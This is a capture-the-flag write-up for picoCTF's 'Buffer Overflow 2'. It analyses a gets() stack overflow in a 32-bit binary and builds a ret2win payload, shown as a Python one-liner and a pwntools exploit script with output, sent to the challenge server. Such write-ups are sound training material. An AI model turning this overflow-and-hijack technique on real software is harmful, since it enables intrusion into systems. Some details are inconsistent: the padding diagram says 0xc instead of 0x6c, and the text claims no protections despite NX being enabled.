# Buffer Overflow 2

**Challenge link:** [picoCTF – Buffer Overflow 2](https://play.picoctf.org/practice/challenge/259?category=6&page=1&search=buffer)

---

## Challenge information

```text
Level:   Medium
Tags:    Binary‑Exploitation, picoCTF 2022, gets, arguments_on_the_stack
Author:  Sanjay C / Palash Oswal

Description:

Control the return address and arguments

This time you'll need to control the arguments to the function you return to! Can you get the flag from this program? You can view source here. 

And connect with it using 
    nc saturn.picoctf.net 57392
```

---

## Manual Exploitation

The challenge archive contains the following files:

```bash
$ ls -lah
total 28
drwxrwxr-x  2 ap   ap    4096 apr 26 00:28 ./
drwxrwxrwt 23 root root  4096 apr 26 00:28 ../
-rw-rw-r--  1 ap   ap   15808 apr 26 00:27 vuln
-rw-rw-r--  1 ap   ap     781 apr 26 00:27 vuln.c
```

```bash
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a429aa852db1511dec3f0143d93e5b1e80e4d845, for GNU/Linux 3.2.0, not stripped
```

`vuln` is a 32‑bit ELF binary that is **not stripped**:

> A binary that is *not stripped* still contains symbol information for functions and globals, which is helpful during analysis.

```bash
$ checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   77 Symbols        No    0               3               vuln
```

No protection techniques applied to the program

```bash
$ readelf -h vuln
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x8049180
  Start of program headers:          52 (bytes into file)
  Start of section headers:          14568 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         12
  Size of section headers:           40 (bytes)
  Number of section headers:         31
  Section header string table index: 30
```

From the information gathered so far we have that the program is not stripped, therefore we identify the functions present in the symbol table.

```bash
$ readelf --syms vuln   # display symbol tables of the program
...

$ readelf --syms vuln | grep -E "(main|vuln|win)$"          # display information about main, vuln and win symbol function discrovered.
    51: 08049338    58 FUNC    GLOBAL DEFAULT   15 vuln
    64: 08049296   162 FUNC    GLOBAL DEFAULT   15 win
    73: 08049372   122 FUNC    GLOBAL DEFAULT   15 main
```

We continue with the static analysis of the binary using a decompiler like Ghidra to better understand the functioning of the program and the vulnerabilities present, or, more simply, we inspect the source code attached to the challenge `vuln.c`.

vuln.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}

```
The `vuln` function is vulnerable to buffer overflow (no limit on the size of user-supplied input to `gets`).

```bash
# Run the program locally
$ chmod u+x vuln
$ ./vuln
Please enter your string: 
```

The `win(int arg1, int arg2)` function takes two integer values ​​as parameters, which are compared to the `0xCAFEF00D` and `0xF00DF00D` respectively.

To return the `flag.txt` a ret2win is needed.

### Crafting the payload

```bash
$ objdump --disassemble=vuln -M intel vuln

08049338 <vuln>:
 8049338:       f3 0f 1e fb             endbr32 
 804933c:       55                      push   ebp
 804933d:       89 e5                   mov    ebp,esp
 804933f:       53                      push   ebx
 8049340:       83 ec 74                sub    esp,0x74
 8049343:       e8 88 fe ff ff          call   80491d0 <__x86.get_pc_thunk.bx>
 8049348:       81 c3 b8 2c 00 00       add    ebx,0x2cb8
 804934e:       83 ec 0c                sub    esp,0xc
 8049351:       8d 45 94                lea    eax,[ebp-0x6c]
 8049354:       50                      push   eax
 8049355:       e8 96 fd ff ff          call   80490f0 <gets@plt>
 804935a:       83 c4 10                add    esp,0x10
 804935d:       83 ec 0c                sub    esp,0xc
 8049360:       8d 45 94                lea    eax,[ebp-0x6c]
 8049363:       50                      push   eax
 8049364:       e8 b7 fd ff ff          call   8049120 <puts@plt>
 8049369:       83 c4 10                add    esp,0x10
 804936c:       90                      nop
 804936d:       8b 5d fc                mov    ebx,DWORD PTR [ebp-0x4]
 8049370:       c9                      leave  
 8049371:       c3                      ret    
```
From the `8049360` instruction, it is clear that `buf` is `0x6c (108)10` bytes away from `saved EBP` on the stack.

So, the payload to be constructed will be as follows:
```text
    [         ...         ]   Higher Address      
    [      saved EIP      ]        
    [      saved EBP      ] 
    ----------------------- <= EBP 
    [         ...         ]        
    [         ...         ]     
    [         buf         ] <= EBP-0x6c
    [         ...         ]     
    ----------------------- <= ESP 
    [         ...         ]   Lower Address

    payload = padding + win() + dummy + arg1 + arg2

    padding = "A"*0xc + "B"*0x4 

    [         ...         ]   Higher Address
    [        arg2         ]        
    [        arg1         ]        
    [        dummy        ]        
    [        win()        ]        
    [        BBBB         ] <= EBP-0x6c
    ----------------------- <= EBP 
    [        AAAA         ] 
    [        AAAA         ] 
    [        AAAA         ] <= EBP-0x6c
    [         ...         ]     
    ----------------------- <= ESP 
    [         ...         ]   Lower Address
```

The `dummy` matches the `saved EIP` for the stack frame of the `win` function.

Abbiamo tutto il necessario per costruire il payload dalle informazioni catturate fin'ora:
```python
# Little‑endian representation
win = 0x08049296 = b'\x96\x92\x04\x08'
arg1 = 0xCAFEF00D = b'\x0d\xf0\xfe\xca'
arg2 = 0xF00DF00D = b'\x0d\xf0\x0d\xf0'
```

```bash
$ echo "Hello World! I win." > flag.txt     # define a flag.txt to perform local test.

# Resume:
# padding                   + 0x6c
# EBP                       + 0x4
# win() 0x08049296          + 0x4
# fake return address       + 0x4
# params_1  0xcafef00d      + 0x4
# params_2  0xf00df00d      + 0x4
# total payload             = 128 bytes

$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*0x6c+b"B"*0x4+b"\x96\x92\x04\x08"+b"\x90"*0x4+b"\x0d\xf0\xfe\xca"+b"\x0d\xf0\x0d\xf0")' | ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Hello World! I win.
Segmentation fault (core dumped)
```

The exploit works successfully!

The challenge is completed by sending the payload to the remote process.

```bash
$ # Save the payload to a file
$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*0x6c+b"B"*0x4+b"\x96\x92\x04\x08"+b"\x90"*0x4+b"\x0d\xf0\xfe\xca"+b"\x0d\xf0\x0d\xf0")' > payload
$ (cat payload; cat) | nc saturn.picoctf.net 57392  # Sending the payload to remote process
Please enter your string: 

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
picoCTF{XXXXXXXXX_X_XXXX_XXXXXXXX}
```

### Exploit script

```python
#!/usr/bin/env python3

from pwn import remote, flat

REMOTE, PORT = 'saturn.picoctf.net', 57392

def exploit():
    io=remote(REMOTE,PORT)
    print(io.recvline())
    
    # Payload crafting
    padding=b"A"*0x6c + b"B"*0x4        # buffer + saved+ebp    @vuln
    win=0x08049296                      # win address
    fake_ret=b"fake"                    # fake return address   @win 
    args_1=0xcafef00d                   # args_1
    args_2=0xf00df00d                   # args_2

    payload=flat([padding, win, fake_ret, args_1, args_2])
    io.sendline(payload)
    print(io.recvline())
    print(io.recvall())

if __name__=="__main__":
    exploit()
```

```bash
$ chmod u+x exploit
$ ./exploit 
[+] Opening connection to saturn.picoctf.net on port 57392: Done
b'Please enter your string: \n'
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\x96\x92\x04\x08fake\r\xf0\xfe\xca\r\xf0\r\xf0\n'
[+] Receiving all data: Done (34B)
[*] Closed connection to saturn.picoctf.net port 57392
b'picoCTF{XXXXXXXXX_X_XXXX_XXXXXXXX}'
```